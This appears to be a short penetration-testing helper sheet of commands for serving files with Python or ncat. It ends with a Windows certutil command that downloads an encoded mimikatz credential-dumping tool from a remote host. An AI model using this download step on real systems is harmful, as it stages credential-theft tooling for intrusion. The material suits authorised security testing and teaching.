# Helpers

[Serving Files](#serving-files)

## Serving Files

**With python:**
```
python -m SimpleHTTPServer 8000
```

**With ncat:**
```
ncat -lk -p 8080 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; cat index.html"
```

## Download Files

**Windows certutil:**
```
certutil.exe -urlcache -split -f http://myhost/mimikatz.b64 mimikatz.b64
```
